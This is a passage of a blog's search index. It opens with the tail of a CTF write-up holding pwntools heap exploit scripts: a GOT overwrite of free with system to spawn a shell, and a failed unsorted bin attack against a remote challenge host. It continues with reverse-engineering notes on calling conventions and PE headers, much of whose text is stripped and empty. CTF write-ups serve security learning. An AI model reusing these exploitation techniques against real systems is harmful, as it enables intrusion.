class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    <span class=\"comment\">#r.recvuntil(\":\")</span></span><br><span class=\"line\">    <span class=\"comment\">#r.sendline(name)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">free_got = heap.got[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">change(<span class=\"number\">0</span>, <span class=\"string\">\"/bin/sh\\x00\"</span> + <span class=\"string\">'A'</span>*<span class=\"number\">0x10</span> + <span class=\"string\">\"\\x41\"</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span> + p64(<span class=\"number\">0x20</span>) + p64(heap.got[<span class=\"string\">'free'</span>]))</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"Content : \"</span>)</span><br><span class=\"line\">data = r.recvuntil(<span class=\"string\">\"Done !\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free_addr = u64(data.split(<span class=\"string\">\"\\n\"</span>)[<span class=\"number\">0</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</span><br><span class=\"line\">libc_base = free_addr -libc.symbols[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">'libc base addr:'</span>+hex(libc_base))</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">change(<span class=\"number\">1</span>,p64(system_addr))</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn7-fail\"><a href=\"#pwn7-fail\" class=\"headerlink\" title=\"pwn7(fail)\"></a>pwn7(fail)</h3><blockquote>\n<p>unsorted bin attack,flagshell</p>\n<p>unsorted bin attack</p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10016</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    <span class=\"comment\">#r.recvuntil(\":\")</span></span><br><span class=\"line\">    <span class=\"comment\">#r.sendline(name)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#def show(idx):</span></span><br><span class=\"line\"><span class=\"comment\">#    r.recvuntil(\":\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.sendline(\"3\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.recvuntil(\":\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.sendline(str(idx))</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"number\">0x6020a0</span></span><br><span class=\"line\">fd = <span class=\"number\">0</span></span><br><span class=\"line\">bk = flag - <span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">0</span>, <span class=\"number\">0x20</span> + <span class=\"number\">0x20</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>) + p64(fd) + p64(bk))</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">\"666\"</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn8-fail\"><a href=\"#pwn8-fail\" class=\"headerlink\" title=\"pwn8(fail)\"></a>pwn8(fail)</h3><blockquote>\n<p>add,size,,edit,,,</p>\n<p></p>\n</blockquote>\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h3><p>ook</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>+</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>qq</p>\n<h3 id=\"flag\"><a href=\"#flag\" class=\"headerlink\" title=\"flag\"></a>flag</h3><p>010</p>\n<h3 id=\"7\"><a href=\"#7\" class=\"headerlink\" title=\"7\"></a>7</h3><p>7</p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<p></p>\n<p></p>\n","categories":["wp"],"tags":["WP"]},{"title":"Book","url":"https://pz1o.top/2020/10/27//","content":"<a id=\"more\"></a>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p>ddl</p>\n<h1 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\" \"></a> </h1><p><strong></strong></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p><strong></strong></p>\n<ol>\n<li></li>\n<li></li>\n</ol>\n<h1 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\" \"></a> </h1><p><strong></strong><br><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210309173427804.png\" alt=\"image-20210309173427804\"></p>\n<ul>\n<li>EAX</li>\n<li>EBX</li>\n<li>ECX</li>\n<li>EDX</li>\n</ul>\n<p><strong></strong></p>\n<ul>\n<li>CS</li>\n<li>SS</li>\n<li>DS</li>\n<li>ES</li>\n<li>FS</li>\n<li>GS</li>\n</ul>\n<p><strong></strong></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210309175356181.png\" alt=\"image-20210309175356181\"></p>\n<h1 id=\"-crackme-2\"><a href=\"#-crackme-2\" class=\"headerlink\" title=\" crackme#2\"></a> crackme#2</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">test ax,ax</span><br><span class=\"line\">&#x2F;&#x2F;0-&gt;ZF&#x3D;1</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push ebp</span><br><span class=\"line\">mov ebp,esp</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><ul>\n<li>nameGetWindowTextGetDlgItemText</li>\n<li>XORADDSUB</li>\n</ul>\n<h3 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h3><ul>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<h1 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\" \"></a> </h1><h2 id=\"10-1-\"><a href=\"#10-1-\" class=\"headerlink\" title=\"10.1 \"></a>10.1 </h2><p></p>\n<ol>\n<li>cdecl</li>\n<li>stdcall</li>\n<li>fastcall</li>\n</ol>\n<p>mainprintf</p>\n<p>mainprintf</p>\n<h3 id=\"cdecl\"><a href=\"#cdecl\" class=\"headerlink\" title=\"cdecl\"></a>cdecl</h3><p>cdecl</p>\n<p>esp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add esp,8</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n</blockquote>\n<h3 id=\"stdcall\"><a href=\"#stdcall\" class=\"headerlink\" title=\"stdcall\"></a>stdcall</h3><p>ccdeclstdcall</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&quot;stdio.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">int _stdcall add(int a,int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn(a+b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">retn 8</span><br><span class=\"line\">retn+pop 8</span><br></pre></td></tr></table></figure>\n<h3 id=\"fastcall\"><a href=\"#fastcall\" class=\"headerlink\" title=\"fastcall\"></a>fastcall</h3><p>stdcall</p>\n<p>4ecxedx</p>\n<p></p>\n<h1 id=\"-PE\"><a href=\"#-PE\" class=\"headerlink\" title=\" PE\"></a> PE</h1><h2 id=\"13-1-\"><a href=\"#13-1-\" class=\"headerlink\" title=\"13.1 \"></a>13.1 </h2><p>PEwindows</p>\n<p>PE3264PE+PE32+PE</p>\n<h2 id=\"13-2-PE\"><a href=\"#13-2-PE\" class=\"headerlink\" title=\"13.2 PE\"></a>13.2 PE</h2><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310153153376.png\" alt=\"image-20210310153153376\"></p>\n<p></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310153813415.png\" alt=\"image-20210310153813415\"></p>\n<h3 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p>PEDOS</p>\n<p>PE</p>\n<p></p>\n<p>.rsrc</p>\n<p></p>\n<p><strong>:/NULL</strong></p>\n<p></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310154744199.png\" alt=\"image-20210310154744199\"></p>\n<h3 id=\"2-VA-amp-RVA\"><a href=\"#2-VA-amp-RVA\" class=\"headerlink\" title=\"2.VA&amp;RVA\"></a>2.VA&amp;RVA</h3><p>VA</p>\n<p>RVA</p>\n<p>VARVA</p>\n<p>dllVA</p>\n<p>RVA</p>\n<blockquote>\n<p>base+RVA=VA</p>\n</blockquote>\n<h2 id=\"13-3-PE\"><a href=\"#13-3-PE\" class=\"headerlink\" title=\"13.3 PE\"></a>13.3 PE</h2><p>PE</p>\n<h3 id=\"1-DOS\"><a href=\"#1-DOS\" class=\"headerlink\" title=\"1.DOS\"></a>1.DOS</h3><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310160306566.png\" alt=\"image-20210310160306566\"></p>\n<blockquote>\n<p>e_magic:DOS4D5A</p>\n<p>e_lfanew:NT</p>\n</blockquote>\n<p>notepad</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310160550894.png\" alt=\"image-20210310160550894\"></p>\n<p>e_lfanew000000E0</p>\n<blockquote>\n<p>IntelCPU</p>\n</blockquote>\n<h3 id=\"2-DOS\"><a href=\"#2-DOS\" class=\"headerlink\" title=\"2.DOS\"></a>2.DOS</h3><p>DOSDOS</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161059662.png\" alt=\"image-20210310161059662\"></p>\n<p></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161449879.png\" alt=\"image-20210310161449879\"></p>\n<p></p>\n<h3 id=\"3-NT\"><a href=\"#3-NT\" class=\"headerlink\" title=\"3.NT\"></a>3.NT</h3><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161601066.png\" alt=\"image-20210310161601066\"></p>\n<blockquote>\n<p>4</p>\n<p></p>\n<p></p>\n</blockquote>\n<p>notepad</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161746973.png\" alt=\"image-20210310161746973\"></p>\n<h3 id=\"4-NT\"><a href=\"#4-NT\" class=\"headerlink\" title=\"4.NT\"></a>4.NT</h3><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310161849517.png\" alt=\"image-20210310161849517\"></p>\n<blockquote>\n<p></p>\n<p>1.Machine</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310162003248.png\" alt=\"image-20210310162003248\"></p>\n<p>2.NumberOfSections</p>\n<p></p>\n<p>3.SizeOfOptionalHeader</p>\n<p>windowsPE</p>\n<p>4.Characteristics</p>\n<p>dll</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310162608891.png\" alt=\"image-20210310162608891\"></p>\n</blockquote>\n<p>notepad</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310162827298.png\" alt=\"image-20210310162827298\"></p>\n<blockquote>\n<p>014C:machine intel 386</p>\n<p>0003:</p>\n<p>:48025287</p>\n<p>00000000:offset to symbol table</p>\n<p>00000000:number of symbols</p>\n<p>00E0</p>\n<p>010F:Characteristics</p>\n</blockquote>\n<h3 id=\"5-\"><a href=\"#5-\" class=\"headerlink\" title=\"5.\"></a>5.</h3><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310163334695.png\" alt=\"image-20210310163334695\"></p>\n<blockquote>\n<p></p>\n<p>1.Magic</p>\n<p>3210B 6420B</p>\n<p>2.AddressOfEntryPoint</p>\n<p>RVA</p>\n<p>3.ImageBase</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310163616650.png\" alt=\"image-20210310163616650\"></p>\n<p>4.SectionAlignmentFileAlignment</p>\n<p>SectionAlignmentFileAlignment</p>\n<p></p>\n<p>5.SizeOfImage</p>\n<p>PEPE Image</p>\n<p>6.SizeOfHeaders</p>\n<p>PEFileAlignment</p>\n<p>SizeOfHeaders</p>\n<p>7.Subsystem</p>\n<p></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310164312289.png\" alt=\"image-20210310164312289\"></p>\n<p>8.NumberOfRvaAndSizes</p>\n<p>1616</p>\n<p>9.DataDirectory</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310164618863.png\" alt=\"image-20210310164618863\"></p>\n<p>4</p>\n</blockquote>\n<p>notepad</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310164805130.png\" alt=\"image-20210310164805130\"></p>\n<blockquote>\n<p>1.magic:010B</p>\n<p>2.AddressOfEntryPoint00739D</p>\n<p>3.ImageBase:01000000</p>\n<p>4.SectionAlignmentFileAlignment:00001000 0000200 </p>\n<p>6.SizeOfHeaders:00000400</p>\n</blockquote>\n<h3 id=\"6-\"><a href=\"#6-\" class=\"headerlink\" title=\"6.\"></a>6.</h3><p></p>\n<p></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310170851347.png\" alt=\"image-20210310170851347\"></p>\n<p></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310170937074.png\" alt=\"image-20210310170937074\"></p>\n<p>VitrtualAddressPointerToRawDataSectionAlignmentFileAlignment</p>\n<p>VirtualSizeSizeOfRawData</p>\n<p>Name</p>\n<p>notepad</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310171432320.png\" alt=\"image-20210310171432320\"></p>\n<blockquote>\n<p>Name:2E746578 .text</p>\n<p>PhysicalAddress:74000000</p>\n<p></p>\n<p>VirtualSize 00007748</p>\n<p>VirtualAddress:00001000</p>\n<p></p>\n<p>SizeOfRawData:00007800</p>\n<p>PointerToRawData:00000400</p>\n</blockquote>\n<h2 id=\"13-4-RVAtoRAW\"><a href=\"#13-4-RVAtoRAW\" class=\"headerlink\" title=\"13.4 RVAtoRAW\"></a>13.4 RVAtoRAW</h2><p></p>\n<p>PE</p>\n<ol>\n<li>RVA</li>\n<li></li>\n</ol>\n<p>RAW=RVA-VirtualAddress+PointerToRawData</p>\n<blockquote>\n<p>RAW:</p>\n<p>RVA</p>\n<p>VirtualAddress</p>\n<p>PointerToRawData</p>\n</blockquote>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310211021165.png\" alt=\"image-20210310211021165\"></p>\n<h2 id=\"13-5-IAT\"><a href=\"#13-5-IAT\" class=\"headerlink\" title=\"13.5 IAT\"></a>13.5 IAT</h2><p>IATImport Address Table</p>\n<p>EATExport Address Table</p>\n<h3 id=\"1-dll\"><a href=\"#1-dll\" class=\"headerlink\" title=\"1.dll\"></a>1.dll</h3><p>dllDynamic Link Library</p>\n<ol>\n<li>dll</li>\n<li>dll</li>\n<li>dll</li>\n</ol>\n<p>dll</p>\n<p></p>\n<h3 id=\"2-IMAGE-IMPORT-DESCRIPTOR\"><a href=\"#2-IMAGE-IMPORT-DESCRIPTOR\" class=\"headerlink\" title=\"2.IMAGE_IMPORT_DESCRIPTOR\"></a>2.IMAGE_IMPORT_DESCRIPTOR</h3><p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310201607756.png\" alt=\"image-20210310201607756\"></p>\n<p>NULL</p>\n<p></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310201721746.png\" alt=\"image-20210310201721746\"></p>\n<p>INTIMAGE_IMPORT_BY_NAME</p>\n<p></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310202126351.png\" alt=\"image-20210310202126351\"></p>\n<p>PE</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310202304928.png\" alt=\"image-20210310202304928\"></p>\n<h3 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h3><p>IMAGE_IMPORT_DESCRIPTOR</p>\n<p>DataDirectoryIMPORT DIRECTORY</p>\n<p>IMAGE_OPTIONAL_HEADER32.DataDirectory[1]:4size</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310203430738.png\" alt=\"image-20210310203430738\"></p>\n<p></p>\n<p>7604-1000+400=6A04</p>\n<p></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204231228.png\" alt=\"image-20210310204231228\"></p>\n<p></p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204430191.png\" alt=\"image-20210310204430191\"></p>\n<p></p>\n<p>1.Name</p>\n<p>Name</p>\n<p><img src=\"/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210310204717043.png\" 